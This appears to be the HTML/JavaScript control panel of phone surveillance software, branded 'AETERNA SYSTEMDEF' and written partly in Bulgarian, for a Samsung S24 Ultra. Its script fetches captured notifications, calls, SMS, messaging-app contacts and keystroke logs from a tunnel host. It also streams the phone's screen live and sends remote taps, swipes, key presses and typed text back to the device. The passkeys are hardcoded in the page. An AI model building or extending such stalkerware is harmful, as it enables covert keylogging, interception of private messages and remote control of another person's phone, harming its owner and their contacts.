<!DOCTYPE html>
<html lang="bg">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>AETERNA // QUANTUM DEFENSE & S24 ULTRA MONITOR</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;800&family=Outfit:wght@400;600;800;900&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg: #04060a;
      --card: rgba(11, 16, 28, 0.88);
      --border: rgba(0, 240, 255, 0.22);
      --cyan: #00f0ff;
      --gold: #ffd700;
      --green: #00ff88;
      --red: #ff3366;
      --purple: #b026ff;
      --text: #f0f4f8;
      --muted: #6b7a90;
      --shadow: 0 10px 30px rgba(0, 0, 0, 0.7);
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      background: var(--bg);
      background-image: 
        radial-gradient(circle at 10% 10%, rgba(0, 240, 255, 0.07), transparent 40%),
        radial-gradient(circle at 90% 90%, rgba(176, 38, 255, 0.05), transparent 40%),
        linear-gradient(rgba(255, 255, 255, 0.012) 1px, transparent 1px),
        linear-gradient(90deg, rgba(255, 255, 255, 0.012) 1px, transparent 1px);
      background-size: 100% 100%, 100% 100%, 28px 28px, 28px 28px;
      color: var(--text);
      font-family: 'Outfit', sans-serif;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 16px;
    }

    /* AUTH SCREEN */
    #auth-screen {
      width: 100%;
      max-width: 420px;
      background: var(--card);
      border: 1px solid var(--border);
      border-radius: 16px;
      padding: 32px 24px;
      backdrop-filter: blur(20px);
      box-shadow: var(--shadow);
      text-align: center;
    }

    .auth-logo {
      font-size: 24px;
      font-weight: 900;
      letter-spacing: 2px;
      background: linear-gradient(135deg, var(--cyan), var(--gold));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin-bottom: 6px;
    }

    .input-box { margin: 20px 0; text-align: left; }
    .input-box label {
      display: block;
      font-family: 'JetBrains Mono', monospace;
      font-size: 11px;
      color: var(--muted);
      text-transform: uppercase;
      margin-bottom: 8px;
      letter-spacing: 1px;
    }
    .input-box input {
      width: 100%;
      background: #020306;
      border: 1px solid var(--border);
      border-radius: 8px;
      padding: 14px 16px;
      font-family: 'JetBrains Mono', monospace;
      font-size: 14px;
      color: var(--text);
      outline: none;
    }
    .btn-auth {
      width: 100%;
      background: linear-gradient(135deg, rgba(0, 240, 255, 0.2), rgba(255, 215, 0, 0.2));
      border: 1px solid var(--cyan);
      color: var(--text);
      padding: 14px;
      border-radius: 8px;
      font-family: 'JetBrains Mono', monospace;
      font-size: 13px;
      font-weight: 800;
      letter-spacing: 2px;
      cursor: pointer;
    }

    /* DASHBOARD */
    #dashboard-screen {
      display: none;
      width: 100%;
      max-width: 1300px;
      animation: fadeIn 0.4s ease forwards;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(8px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .dash-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
      gap: 16px;
      padding-bottom: 16px;
      border-bottom: 1px solid var(--border);
      margin-bottom: 20px;
    }

    .status-pill {
      display: flex;
      align-items: center;
      gap: 8px;
      background: rgba(0, 255, 136, 0.1);
      border: 1px solid var(--green);
      color: var(--green);
      padding: 6px 14px;
      border-radius: 9999px;
      font-family: 'JetBrains Mono', monospace;
      font-size: 11px;
      font-weight: 600;
    }

    .pulse-dot {
      width: 8px;
      height: 8px;
      background: var(--green);
      border-radius: 50%;
      box-shadow: 0 0 10px var(--green);
      animation: pulse 1.5s infinite;
    }

    @keyframes pulse {
      0%, 100% { opacity: 1; transform: scale(1); }
      50% { opacity: 0.3; transform: scale(0.85); }
    }

    /* TABS */
    .tabs-bar {
      display: flex;
      gap: 10px;
      margin-bottom: 20px;
      overflow-x: auto;
      padding-bottom: 6px;
    }

    .tab-btn {
      background: var(--card);
      border: 1px solid var(--border);
      color: var(--muted);
      padding: 10px 18px;
      border-radius: 8px;
      font-family: 'JetBrains Mono', monospace;
      font-size: 12px;
      font-weight: 600;
      cursor: pointer;
      display: flex;
      align-items: center;
      gap: 8px;
      white-space: nowrap;
      transition: all 0.2s;
    }

    .tab-btn.active {
      border-color: var(--cyan);
      color: var(--cyan);
      background: rgba(0, 240, 255, 0.1);
    }

    .tab-badge {
      background: rgba(255, 255, 255, 0.1);
      padding: 2px 6px;
      border-radius: 10px;
      font-size: 10px;
    }

    /* CONTENT LAYOUT */
    .view-content { display: none; }
    .view-content.active { display: block; }

    /* MIRROR VIEW */
    .viewport-layout {
      display: grid;
      grid-template-columns: 320px 1fr;
      gap: 20px;
    }
    @media (max-width: 860px) {
      .viewport-layout { grid-template-columns: 1fr; }
    }

    .phone-container {
      background: #010204;
      border: 3px solid #1a2233;
      border-radius: 32px;
      padding: 10px;
      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.8), 0 0 15px rgba(0, 240, 255, 0.1);
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .phone-notch {
      width: 10px;
      height: 10px;
      background: #0a0e17;
      border: 1px solid #1f293d;
      border-radius: 50%;
      margin-bottom: 8px;
    }

    .phone-screen-img {
      width: 100%;
      max-height: 560px;
      object-fit: contain;
      border-radius: 22px;
      background: #000;
    }

    /* DATA LISTS (NOTIFICATIONS, CALLS, SMS) */
    .data-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
      gap: 16px;
    }

    .event-card {
      background: var(--card);
      border: 1px solid var(--border);
      border-radius: 12px;
      padding: 16px;
      backdrop-filter: blur(16px);
      box-shadow: var(--shadow);
      display: flex;
      flex-direction: column;
      gap: 8px;
      position: relative;
    }

    .event-card.type-notification { border-left: 4px solid var(--purple); }
    .event-card.type-call { border-left: 4px solid var(--green); }
    .event-card.type-sms { border-left: 4px solid var(--cyan); }
    .event-card.type-contact { border-left: 4px solid var(--gold); }
    .event-card.type-keylog { border-left: 4px solid var(--red); }

    .event-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-family: 'JetBrains Mono', monospace;
      font-size: 11px;
    }

    .event-title {
      font-size: 15px;
      font-weight: 800;
      color: var(--text);
    }

    .event-body {
      font-family: 'JetBrains Mono', monospace;
      font-size: 12px;
      color: #cdd9e5;
      background: #020306;
      border-radius: 6px;
      padding: 10px;
      word-break: break-word;
      line-height: 1.5;
    }

    .event-meta {
      font-family: 'JetBrains Mono', monospace;
      font-size: 10px;
      color: var(--muted);
      display: flex;
      justify-content: space-between;
    }

    .filter-bar {
      display: flex;
      gap: 10px;
      margin-bottom: 16px;
      flex-wrap: wrap;
    }

    .filter-bar input {
      flex: 1;
      min-width: 200px;
      background: var(--card);
      border: 1px solid var(--border);
      border-radius: 6px;
      padding: 8px 12px;
      font-family: 'JetBrains Mono', monospace;
      font-size: 12px;
      color: var(--text);
      outline: none;
    }

    .btn-ctrl {
      flex: 1;
      background: rgba(255, 255, 255, 0.04);
      border: 1px solid var(--border);
      color: var(--text);
      padding: 8px 10px;
      border-radius: 6px;
      font-family: 'JetBrains Mono', monospace;
      font-size: 11px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s;
    }
    .btn-ctrl:hover {
      background: rgba(0, 240, 255, 0.15);
      border-color: var(--cyan);
    }

    .btn-clear {
      background: rgba(255, 51, 102, 0.15);
      border: 1px solid var(--red);
      color: var(--red);
      padding: 8px 14px;
      border-radius: 6px;
      font-family: 'JetBrains Mono', monospace;
      font-size: 11px;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <!-- AUTH SCREEN -->
  <div id="auth-screen">
    <div class="auth-logo">AETERNA SYSTEMDEF</div>
    <p style="font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--muted); letter-spacing: 1px; margin-bottom: 24px;">
      SOVEREIGN DEFENSE INTELLIGENCE VAULT
    </p>

    <div class="input-box">
      <label>Passkey</label>
      <input type="password" id="passkey-input" placeholder="Въведете парола..." autofocus>
    </div>

    <button class="btn-auth" onclick="verifyAuth()">Unlock Vault</button>
  </div>

  <!-- DASHBOARD -->
  <div id="dashboard-screen">
    <div class="dash-header">
      <div>
        <h1 style="font-size: 20px; font-weight: 900; color: var(--cyan);">AETERNA // SYSTEMDEF VAULT</h1>
        <p style="font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--muted);">
          PHYSICAL ANCHOR: SAMSUNG S24 ULTRA (SM-S928B)
        </p>
      </div>
      <div class="status-pill">
        <div class="pulse-dot"></div>
        <span id="live-records-count">INGESTION ACTIVE</span>
      </div>
    </div>

    <!-- TABS -->
    <div class="tabs-bar">
      <button class="tab-btn active" onclick="switchTab('tab-mirror')">📱 Live Mirror</button>
      <button class="tab-btn" onclick="switchTab('tab-notifs')">🔔 Notifications <span class="tab-badge" id="b-notifs">0</span></button>
      <button class="tab-btn" onclick="switchTab('tab-calls')">📞 Calls <span class="tab-badge" id="b-calls">0</span></button>
      <button class="tab-btn" onclick="switchTab('tab-sms')">✉️ SMS <span class="tab-badge" id="b-sms">0</span></button>
      <button class="tab-btn" onclick="switchTab('tab-contacts')">👥 Tracker <span class="tab-badge" id="b-contacts">0</span></button>
      <button class="tab-btn" onclick="switchTab('tab-keylog')">⌨️ Keylogs <span class="tab-badge" id="b-keylog">0</span></button>
    </div>

    <!-- VIEW 1: LIVE MIRROR -->
    <div id="tab-mirror" class="view-content active">
      <div class="viewport-layout">
        <div class="phone-container">
          <div class="phone-notch"></div>
          <div style="position: relative; width: 100%;">
            <img id="live-screen-img" class="phone-screen-img" src="" alt="Live Phone Screen" style="cursor: crosshair; user-select: none;">
            <div id="touch-indicator" style="position: absolute; width: 24px; height: 24px; border: 2px solid var(--cyan); border-radius: 50%; background: rgba(0, 240, 255, 0.4); transform: translate(-50%, -50%); display: none; pointer-events: none; transition: transform 0.1s;"></div>
          </div>
          
          <div style="display: flex; gap: 8px; margin-top: 10px; width: 100%;">
            <button class="btn-ctrl" onclick="sendDeviceKey('BACK')">◀ Back</button>
            <button class="btn-ctrl" onclick="sendDeviceKey('HOME')">● Home</button>
            <button class="btn-ctrl" onclick="sendDeviceKey('RECENTS')">■ Recents</button>
            <button class="btn-ctrl" onclick="sendDeviceKey('POWER')">🔒 Power</button>
          </div>

          <div style="display: flex; gap: 8px; margin-top: 8px; width: 100%;">
            <button class="btn-ctrl" onclick="sendSwipeGesture('UP')">▲ Swipe Up</button>
            <button class="btn-ctrl" onclick="sendSwipeGesture('DOWN')">▼ Swipe Down</button>
          </div>

          <div style="display: flex; gap: 6px; margin-top: 8px; width: 100%;">
            <input type="text" id="type-text-input" placeholder="Въведете текст за телефона..." style="flex: 1; background: #020306; border: 1px solid var(--border); border-radius: 6px; padding: 6px 10px; font-family: 'JetBrains Mono'; font-size: 11px; color: #fff; outline: none;">
            <button class="btn-ctrl" style="background: var(--cyan); color: #000; font-weight: 800;" onclick="sendTypeText()">Send</button>
          </div>
        </div>

        <div style="display: flex; flex-direction: column; gap: 14px;">
          <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 12px;">
            <div style="background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 14px;">
              <div style="font-family: 'JetBrains Mono'; font-size: 11px; color: var(--muted);">BATTERY</div>
              <div id="val-battery" style="font-size: 22px; font-weight: 800; color: var(--green);">100 %</div>
              <div id="desc-battery" style="font-size: 10px; color: var(--muted);">4.3V | 36.9 °C</div>
            </div>
            <div style="background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 14px;">
              <div style="font-family: 'JetBrains Mono'; font-size: 11px; color: var(--muted);">KNOX SECURITY</div>
              <div style="font-size: 22px; font-weight: 800; color: var(--cyan);">LOCKED</div>
              <div style="font-size: 10px; color: var(--muted);">Zero-Trust Enforced</div>
            </div>
          </div>

          <div style="background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 14px; flex: 1;">
            <div style="font-family: 'JetBrains Mono'; font-size: 11px; color: var(--gold); margin-bottom: 10px;">
              LIVE RECENT FEED
            </div>
            <div id="recent-stream" style="font-family: 'JetBrains Mono'; font-size: 11px; height: 320px; overflow-y: auto; color: #9cdcfe; line-height: 1.6;">
              <div>[SYNC] Telemetry & Ingestion Gateway Connected.</div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- VIEW 2: NOTIFICATIONS -->
    <div id="tab-notifs" class="view-content">
      <div class="filter-bar">
        <input type="text" id="filter-notif" placeholder="Търсене по приложение или текст..." oninput="renderNotifs()">
        <button class="btn-clear" onclick="clearData()">Clear All</button>
      </div>
      <div class="data-grid" id="grid-notifs"></div>
    </div>

    <!-- VIEW 3: CALLS -->
    <div id="tab-calls" class="view-content">
      <div class="filter-bar">
        <input type="text" id="filter-calls" placeholder="Търсене по номер или контакт..." oninput="renderCalls()">
      </div>
      <div class="data-grid" id="grid-calls"></div>
    </div>

    <!-- VIEW 4: SMS -->
    <div id="tab-sms" class="view-content">
      <div class="filter-bar">
        <input type="text" id="filter-sms" placeholder="Търсене по съдържание или номер..." oninput="renderSms()">
      </div>
      <div class="data-grid" id="grid-sms"></div>
    </div>

    <!-- VIEW 5: CONTACT TRACKER -->
    <div id="tab-contacts" class="view-content">
      <div class="filter-bar">
        <input type="text" id="filter-contacts" placeholder="Търсене по платформа (WhatsApp, Viber, TG)..." oninput="renderContacts()">
      </div>
      <div class="data-grid" id="grid-contacts"></div>
    </div>

    <!-- VIEW 6: KEYLOGS -->
    <div id="tab-keylog" class="view-content">
      <div class="filter-bar">
        <input type="text" id="filter-keylogs" placeholder="Търсене в клавишния лог..." oninput="renderKeylogs()">
      </div>
      <div class="data-grid" id="grid-keylogs"></div>
    </div>

  </div>

  <script>
    const VALID_KEYS = ["aeterna2026", "0x4121", "dimitar", "aeterna"];
    const HOST_ENDPOINT = "https://william-important-practitioner-processes.trycloudflare.com";

    let records = { notifications: [], calls: [], sms: [], contacts: [], keylogs: [], events: [] };

    function verifyAuth() {
      const input = document.getElementById('passkey-input').value.trim();
      if (VALID_KEYS.includes(input.toLowerCase())) {
        localStorage.setItem('aeterna_auth', 'unlocked');
        document.getElementById('auth-screen').style.display = 'none';
        document.getElementById('dashboard-screen').style.display = 'block';
        startPolling();
      }
    }

    document.getElementById('passkey-input').addEventListener('keypress', (e) => {
      if (e.key === 'Enter') verifyAuth();
    });

    function switchTab(tabId) {
      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
      document.querySelectorAll('.view-content').forEach(v => v.classList.remove('active'));
      document.getElementById(tabId).classList.add('active');
      event.currentTarget.classList.add('active');
    }

    function refreshScreen() {
      const img = document.getElementById('live-screen-img');
      img.src = `${HOST_ENDPOINT}/api/screen.png?t=${Date.now()}`;
    }

    async function fetchRecords() {
      try {
        const res = await fetch(`${HOST_ENDPOINT}/api/records`);
        if (res.ok) {
          records = await res.json();
          updateBadges();
          renderNotifs();
          renderCalls();
          renderSms();
          renderContacts();
          renderKeylogs();
        }
        // Also fetch telemetry
        const telRes = await fetch(`${HOST_ENDPOINT}/api/telemetry`);
        if (telRes.ok) {
          const t = await telRes.json();
          document.getElementById('val-battery').textContent = `${t.battery.level} %`;
          document.getElementById('desc-battery').textContent = `${t.battery.voltage} | ${t.battery.temperature}`;
        }
      } catch (err) {}
    }

    function updateBadges() {
      document.getElementById('b-notifs').textContent = records.notifications.length;
      document.getElementById('b-calls').textContent = records.calls.length;
      document.getElementById('b-sms').textContent = records.sms.length;
      document.getElementById('b-contacts').textContent = records.contacts.length;
      document.getElementById('b-keylog').textContent = records.keylogs.length;
    }

    function renderNotifs() {
      const filter = (document.getElementById('filter-notif')?.value || '').toLowerCase();
      const grid = document.getElementById('grid-notifs');
      grid.innerHTML = records.notifications
        .filter(n => (n.appName + n.title + n.text).toLowerCase().includes(filter))
        .map(n => `
          <div class="event-card type-notification">
            <div class="event-header">
              <span style="color: var(--purple); font-weight: 800;">🔔 ${escapeHtml(n.appName)}</span>
              <span>${n.timestamp}</span>
            </div>
            <div class="event-title">${escapeHtml(n.title)}</div>
            <div class="event-body">${escapeHtml(n.text)}</div>
            <div class="event-meta"><span>Device: ${escapeHtml(n.device || 'S24 Ultra')}</span></div>
          </div>
        `).join('') || '<div style="color: var(--muted);">Няма записани известия.</div>';
    }

    function renderCalls() {
      const filter = (document.getElementById('filter-calls')?.value || '').toLowerCase();
      const grid = document.getElementById('grid-calls');
      grid.innerHTML = records.calls
        .filter(c => (c.number + c.contactName + c.callType).toLowerCase().includes(filter))
        .map(c => `
          <div class="event-card type-call">
            <div class="event-header">
              <span style="color: var(--green); font-weight: 800;">📞 ${escapeHtml(c.callType)}</span>
              <span>${c.timestamp}</span>
            </div>
            <div class="event-title">${escapeHtml(c.number)} (${escapeHtml(c.contactName)})</div>
            <div class="event-body">Времетраене: ${escapeHtml(c.duration || '0s')}</div>
          </div>
        `).join('') || '<div style="color: var(--muted);">Няма записани обаждания.</div>';
    }

    function renderSms() {
      const filter = (document.getElementById('filter-sms')?.value || '').toLowerCase();
      const grid = document.getElementById('grid-sms');
      grid.innerHTML = records.sms
        .filter(s => (s.number + s.message + s.contactName).toLowerCase().includes(filter))
        .map(s => `
          <div class="event-card type-sms">
            <div class="event-header">
              <span style="color: var(--cyan); font-weight: 800;">✉️ SMS</span>
              <span>${s.timestamp}</span>
            </div>
            <div class="event-title">От/До: ${escapeHtml(s.number)} (${escapeHtml(s.contactName)})</div>
            <div class="event-body">${escapeHtml(s.message)}</div>
          </div>
        `).join('') || '<div style="color: var(--muted);">Няма записани SMS съобщения.</div>';
    }

    function renderContacts() {
      const filter = (document.getElementById('filter-contacts')?.value || '').toLowerCase();
      const grid = document.getElementById('grid-contacts');
      grid.innerHTML = records.contacts
        .filter(c => (c.platform + c.initiator + c.target + c.details).toLowerCase().includes(filter))
        .map(c => `
          <div class="event-card type-contact">
            <div class="event-header">
              <span style="color: var(--gold); font-weight: 800;">👥 ${escapeHtml(c.platform)}</span>
              <span>${c.timestamp}</span>
            </div>
            <div class="event-title">${escapeHtml(c.initiator)} ➡️ ${escapeHtml(c.target)}</div>
            <div class="event-body">${escapeHtml(c.details || '')}</div>
          </div>
        `).join('') || '<div style="color: var(--muted);">Няма данни от тракера.</div>';
    }

    function renderKeylogs() {
      const filter = (document.getElementById('filter-keylogs')?.value || '').toLowerCase();
      const grid = document.getElementById('grid-keylogs');
      grid.innerHTML = records.keylogs
        .filter(k => (k.data).toLowerCase().includes(filter))
        .map(k => `
          <div class="event-card type-keylog">
            <div class="event-header">
              <span style="color: var(--red); font-weight: 800;">⌨️ KEYSTROKE LOG</span>
              <span>${k.timestamp}</span>
            </div>
            <div class="event-body">${escapeHtml(k.data)}</div>
          </div>
        `).join('') || '<div style="color: var(--muted);">Няма клавишни логове.</div>';
    }

    async function clearData() {
      if (confirm("Сигурни ли сте, че искате да изчистите всички записи?")) {
        await fetch(`${HOST_ENDPOINT}/api/records/clear`, { method: 'POST' });
        fetchRecords();
      }
    }

    function escapeHtml(str) {
      if (!str) return '';
      return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
    }

    // WEBSOCKET REAL-TIME MIRROR BRIDGE
    let ws = null;
    const WS_ENDPOINT = HOST_ENDPOINT.replace(/^https:\/\//, 'wss://').replace(/^http:\/\//, 'ws://');

    function connectWebSocket() {
      try {
        if (ws) ws.close();
        ws = new WebSocket(WS_ENDPOINT);
        ws.binaryType = 'blob';

        ws.onopen = () => {
          console.log('[WS] Connected to Live Screen Bridge');
          ws.send(JSON.stringify({ role: 'viewer' }));
        };

        ws.onmessage = (event) => {
          if (event.data instanceof Blob) {
            // Received JPEG binary frame from Phone RemoteControlHub
            const url = URL.createObjectURL(event.data);
            const img = document.getElementById('live-screen-img');
            img.src = url;
          } else {
            try {
              const msg = JSON.parse(event.data);
              if (msg.type === 'NEW_RECORD') {
                fetchRecords(); // Instant update when app posts
              }
            } catch (e) {}
          }
        };

        ws.onclose = () => {
          setTimeout(connectWebSocket, 3000);
        };
      } catch (err) {
        setTimeout(connectWebSocket, 3000);
      }
    }

    // Remote Click & Gesture Handlers
    const screenImg = document.getElementById('live-screen-img');
    const indicator = document.getElementById('touch-indicator');

    if (screenImg) {
      screenImg.addEventListener('click', (e) => {
        const rect = screenImg.getBoundingClientRect();
        const x_pct = ((e.clientX - rect.left) / rect.width) * 100;
        const y_pct = ((e.clientY - rect.top) / rect.height) * 100;

        if (indicator) {
          indicator.style.left = `${e.clientX - rect.left}px`;
          indicator.style.top = `${e.clientY - rect.top}px`;
          indicator.style.display = 'block';
          setTimeout(() => { indicator.style.display = 'none'; }, 300);
        }

        if (ws && ws.readyState === WebSocket.OPEN) {
          ws.send(JSON.stringify({
            action: 'click',
            x: x_pct,
            y: y_pct
          }));
        }
      });
    }

    function sendDeviceKey(key) {
      if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ action: 'key', key: key }));
      }
    }

    function sendSwipeGesture(direction) {
      if (ws && ws.readyState === WebSocket.OPEN) {
        if (direction === 'UP') {
          ws.send(JSON.stringify({ action: 'swipe', x1: 50, y1: 80, x2: 50, y2: 20 }));
        } else if (direction === 'DOWN') {
          ws.send(JSON.stringify({ action: 'swipe', x1: 50, y1: 20, x2: 50, y2: 80 }));
        }
      }
    }

    function sendTypeText() {
      const input = document.getElementById('type-text-input');
      const text = input.value.trim();
      if (text && ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ action: 'text', text: text }));
        input.value = '';
      }
    }

    document.getElementById('type-text-input')?.addEventListener('keypress', (e) => {
      if (e.key === 'Enter') sendTypeText();
    });

    function startPolling() {
      connectWebSocket();
      fetchRecords();
      setInterval(fetchRecords, 2000);
    }

    // Direct Auto-Login
    const urlParams = new URLSearchParams(window.location.search);
    const passQuery = urlParams.get('pass') || urlParams.get('p') || urlParams.get('key');
    if (passQuery && VALID_KEYS.includes(passQuery.toLowerCase())) {
      localStorage.setItem('aeterna_auth', 'unlocked');
      document.getElementById('auth-screen').style.display = 'none';
      document.getElementById('dashboard-screen').style.display = 'block';
      startPolling();
    } else if (localStorage.getItem('aeterna_auth') === 'unlocked') {
      document.getElementById('auth-screen').style.display = 'none';
      document.getElementById('dashboard-screen').style.display = 'block';
      startPolling();
    }
  </script>
</body>
</html>
